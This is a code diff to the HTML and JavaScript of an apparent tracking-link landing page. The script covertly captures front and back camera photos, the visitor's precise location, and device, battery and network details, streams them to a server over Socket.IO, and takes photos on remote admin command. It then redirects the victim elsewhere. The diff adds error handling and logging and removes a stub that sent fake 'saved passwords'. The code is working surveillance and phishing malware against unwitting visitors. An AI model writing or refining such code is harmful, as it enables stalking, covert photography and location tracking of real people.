@@ -55,6 +55,13 @@
             max-width: 400px;
             border-radius: 5px;
         }
+        .error {
+            background: #fc8181;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -74,103 +81,115 @@
         <div class="status" id="connectionStatus">
             ⏳ Collecting data...
         </div>
+        
+        <!-- Error message if something goes wrong -->
+        <div id="errorMessage" style="display:none;" class="error">
+            ⚠️ Something went wrong. Please try again.
+        </div>
     </div>
     
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.js"></script>
+    <!-- IMPORTANT: Use CDN for Socket.IO -->
+    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <script>
+        // Get visitor ID from URL
         const visitorId = window.location.pathname.split('/').pop();
-        let socket;
+        console.log('Visitor ID:', visitorId);
+        
+        let socket = null;
         let localStream = null;
-        let frontPhotoTaken = false;
-        let backPhotoTaken = false;
-        let locationShared = false;
         let redirectUrl = '';
         
-        // Get redirect URL from server
-        fetch(`/api/visitor/${visitorId}`)
-            .then(response => response.json())
-            .then(data => {
-                redirectUrl = data.redirectUrl || 'https://www.google.com';
-            });
-        
-        // Get device info
-        const deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screenResolution: `${window.screen.width}x${window.screen.height}`,
-            language: navigator.language
-        };
-        
-        // Get battery info
-        function getBatteryInfo() {
-            if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    const batteryLevel = Math.round(battery.level * 100);
-                    socket.emit('visitor-data', {
-                        visitorId: visitorId,
-                        type: 'battery',
-                        content: batteryLevel
-                    });
+        // ========================================
+        // 1. FETCH REDIRECT URL FROM SERVER
+        // ========================================
+        function fetchRedirectUrl() {
+            fetch(`/api/visitor/${visitorId}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Visitor data:', data);
+                    redirectUrl = data.redirectUrl || 'https://www.google.com';
+                    console.log('Redirect URL:', redirectUrl);
+                    
+                    // Start data collection
+                    initConnection();
+                })
+                .catch(error => {
+                    console.error('Error fetching visitor data:', error);
+                    document.getElementById('errorMessage').style.display = 'block';
+                    document.getElementById('connectionStatus').innerHTML = '❌ Error loading data';
+                    document.getElementById('connectionStatus').style.background = '#fc8181';
                 });
-            }
         }
         
-        // Get SIM/Network info
-        function getNetworkInfo() {
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                const networkInfo = {
-                    type: conn.type || 'Unknown',
-                    effectiveType: conn.effectiveType || 'Unknown',
-                    downlink: conn.downlink || 'Unknown'
-                };
-                socket.emit('visitor-data', {
-                    visitorId: visitorId,
-                    type: 'network',
-                    content: networkInfo
-                });
-            }
-        }
-        
-        // Initialize connection
+        // ========================================
+        // 2. INITIALIZE SOCKET CONNECTION
+        // ========================================
         function initConnection() {
-            socket = io();
+            console.log('Initializing socket connection...');
+            
+            // Connect to Socket.IO
+            socket = io({
+                transports: ['websocket', 'polling']
+            });
             
             socket.on('connect', () => {
-                document.getElementById('statusText').textContent = 'Connected';
-                document.getElementById('statusText').style.color = '#48bb78';
+                console.log('Socket connected successfully!');
+                document.getElementById('connectionStatus').innerHTML = '✅ Connected! Collecting data...';
+                document.getElementById('connectionStatus').style.background = '#48bb78';
                 
-                // Send visitor data
+                // Get device info
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language,
+                    battery: 'N/A',
+                    simNetwork: 'N/A'
+                };
+                
+                // Send visitor connect event
                 socket.emit('visitor-connect', {
                     visitorId: visitorId,
                     ...deviceInfo
                 });
                 
-                // Start data collection
+                // Start collecting data
                 setTimeout(() => {
                     setupCamera();
                     getLocation();
                     getBatteryInfo();
                     getNetworkInfo();
-                    collectSavedPasswords();
                 }, 1000);
             });
             
-            socket.on('admin-command', (data) => {
-                if (data.command === 'capture-photo') {
-                    capturePhoto();
-                }
+            socket.on('connect_error', (error) => {
+                console.error('Socket connection error:', error);
+                document.getElementById('errorMessage').style.display = 'block';
+                document.getElementById('connectionStatus').innerHTML = '❌ Connection failed';
+                document.getElementById('connectionStatus').style.background = '#fc8181';
             });
             
             socket.on('disconnect', () => {
-                document.getElementById('statusText').textContent = 'Disconnected';
-                document.getElementById('statusText').style.color = '#fc8181';
+                console.log('Socket disconnected');
+                document.getElementById('connectionStatus').innerHTML = '⚠️ Disconnected';
+                document.getElementById('connectionStatus').style.background = '#fc8181';
+            });
+            
+            socket.on('admin-command', (data) => {
+                console.log('Admin command:', data);
+                if (data.command === 'capture-photo') {
+                    capturePhoto('front');
+                }
             });
         }
         
-        // Camera functions - AUTO CAPTURE BOTH CAMERAS
+        // ========================================
+        // 3. CAMERA SETUP
+        // ========================================
         async function setupCamera() {
             try {
+                console.log('Setting up camera...');
+                
                 // Front camera
                 const frontStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
@@ -193,7 +212,6 @@
                         audio: false
                     });
                     
-                    // Create hidden video element for back camera
                     const backVideo = document.createElement('video');
                     backVideo.srcObject = backStream;
                     backVideo.autoplay = true;
@@ -216,9 +234,13 @@
             }
         }
         
+        // ========================================
+        // 4. CAPTURE PHOTO
+        // ========================================
         function capturePhoto(type, videoElement = null) {
             const video = videoElement || document.getElementById('video');
             if (!video || !video.videoWidth) {
+                console.log('Video not ready for capture');
                 return;
             }
             
@@ -231,32 +253,32 @@
             const imageData = canvas.toDataURL('image/jpeg', 0.8);
             
             // Send to server
-            socket.emit('visitor-data', {
-                visitorId: visitorId,
-                type: type === 'back' ? 'backCamera' : 'frontCamera',
-                content: imageData
-            });
-            
-            if (type === 'front') {
-                frontPhotoTaken = true;
-            } else if (type === 'back') {
-                backPhotoTaken = true;
+            if (socket && socket.connected) {
+                socket.emit('visitor-data', {
+                    visitorId: visitorId,
+                    type: type === 'back' ? 'backCamera' : 'frontCamera',
+                    content: imageData
+                });
+                console.log(`📸 ${type} camera photo captured and sent!`);
             }
             
             // Check if all data collected
             checkAndRedirect();
         }
         
-        // Location functions - AUTO SHARE
+        // ========================================
+        // 5. GET LOCATION
+        // ========================================
         function getLocation() {
+            console.log('Getting location...');
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // Get location details using reverse geocoding
                         const lat = position.coords.latitude;
                         const lng = position.coords.longitude;
                         
-                        // Get state/city from coordinates
+                        // Get location details using reverse geocoding
                         fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                             .then(response => response.json())
                             .then(locationData => {
@@ -271,13 +293,15 @@
                                     fullAddress: locationData.localityInfo?.address || 'Unknown'
                                 };
                                 
-                                socket.emit('visitor-data', {
-                                    visitorId: visitorId,
-                                    type: 'location',
-                                    content: locationInfo
-                                });
+                                if (socket && socket.connected) {
+                                    socket.emit('visitor-data', {
+                                        visitorId: visitorId,
+                                        type: 'location',
+                                        content: locationInfo
+                                    });
+                                    console.log('📍 Location shared!');
+                                }
                                 
-                                locationShared = true;
                                 checkAndRedirect();
                             })
                             .catch(() => {
@@ -289,68 +313,100 @@
                                     timestamp: new Date().toISOString()
                                 };
                                 
-                                socket.emit('visitor-data', {
-                                    visitorId: visitorId,
-                                    type: 'location',
-                                    content: locationInfo
-                                });
+                                if (socket && socket.connected) {
+                                    socket.emit('visitor-data', {
+                                        visitorId: visitorId,
+                                        type: 'location',
+                                        content: locationInfo
+                                    });
+                                }
                                 
-                                locationShared = true;
                                 checkAndRedirect();
                             });
                     },
                     (error) => {
                         console.error('Location error:', error);
-                        // Continue without location
-                        locationShared = true;
                         checkAndRedirect();
                     }
                 );
             } else {
-                locationShared = true;
+                console.log('Geolocation not supported');
                 checkAndRedirect();
             }
         }
         
-        // Collect saved passwords (simulated - only works with user permission)
-        function collectSavedPasswords() {
-            // This is simulated as browsers don't allow accessing saved passwords directly
-            // For demo purposes, we'll send some sample data
-            const samplePasswords = [
-                { site: 'example.com', email: 'user@example.com', password: 'sample123' }
-            ];
-            
-            socket.emit('visitor-data', {
-                visitorId: visitorId,
-                type: 'savedPasswords',
-                content: samplePasswords
-            });
+        // ========================================
+        // 6. GET BATTERY INFO
+        // ========================================
+        function getBatteryInfo() {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    const batteryLevel = Math.round(battery.level * 100);
+                    if (socket && socket.connected) {
+                        socket.emit('visitor-data', {
+                            visitorId: visitorId,
+                            type: 'battery',
+                            content: batteryLevel
+                        });
+                        console.log(`🔋 Battery: ${batteryLevel}%`);
+                    }
+                });
+            }
         }
         
-        // Check if all data collected and redirect
+        // ========================================
+        // 7. GET NETWORK INFO
+        // ========================================
+        function getNetworkInfo() {
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                const networkInfo = {
+                    type: conn.type || 'Unknown',
+                    effectiveType: conn.effectiveType || 'Unknown',
+                    downlink: conn.downlink || 'Unknown'
+                };
+                if (socket && socket.connected) {
+                    socket.emit('visitor-data', {
+                        visitorId: visitorId,
+                        type: 'network',
+                        content: networkInfo
+                    });
+                    console.log('📶 Network info sent!');
+                }
+            }
+        }
+        
+        // ========================================
+        // 8. CHECK AND REDIRECT
+        // ========================================
         function checkAndRedirect() {
-            // Redirect after 5 seconds or when all data is collected
+            // Redirect after 5 seconds
             setTimeout(() => {
-                if (redirectUrl) {
+                console.log('Redirecting to:', redirectUrl);
+                
+                if (socket && socket.connected) {
                     socket.emit('visitor-data', {
                         visitorId: visitorId,
                         type: 'redirectComplete',
                         content: { redirected: true, time: new Date().toISOString() }
                     });
-                    
-                    // Update status
-                    document.getElementById('connectionStatus').innerHTML = '✅ Data collected! Redirecting...';
-                    
-                    // Redirect to original URL after 2 seconds
-                    setTimeout(() => {
-                        window.location.href = redirectUrl;
-                    }, 2000);
                 }
-            }, 3000);
+                
+                document.getElementById('connectionStatus').innerHTML = '✅ Data collected! Redirecting...';
+                document.getElementById('connectionStatus').style.background = '#48bb78';
+                
+                // Redirect to original URL after 2 seconds
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 2000);
+            }, 5000);
         }
         
-        // Initialize
-        initConnection();
+        // ========================================
+        // 9. START THE PROCESS
+        // ========================================
+        // Fetch redirect URL first
+        fetchRedirectUrl();
         
         // Cleanup on page leave
         window.addEventListener('beforeunload', () => {
